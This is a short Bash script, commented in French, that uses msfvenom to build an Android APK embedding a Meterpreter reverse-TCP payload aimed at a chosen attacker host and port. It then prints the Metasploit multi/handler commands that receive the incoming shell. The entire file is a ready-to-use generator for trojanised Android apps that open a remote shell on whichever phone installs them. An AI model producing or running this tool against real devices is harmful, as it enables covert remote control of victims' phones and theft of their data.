#!/bin/bash

# payload-android.sh – Générateur de payload Android (.apk) avec msfvenom
# Utilisation : ./payload-android.sh <LHOST> <LPORT> <Nom_de_fichier>

if [ "$#" -ne 3 ]; then
  echo "Usage : $0 <LHOST> <LPORT> <Nom_de_fichier.apk>"
  exit 1
fi

LHOST=$1
LPORT=$2
FILENAME=$3

echo "[*] Génération du payload Android avec msfvenom..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $FILENAME

echo "[✓] Payload APK créé : $FILENAME"
echo "[!] Configure ton listener dans Metasploit avec :"
echo "    use exploit/multi/handler"
echo "    set payload android/meterpreter/reverse_tcp"
echo "    set LHOST $LHOST"
echo "    set LPORT $LPORT"
echo "    run"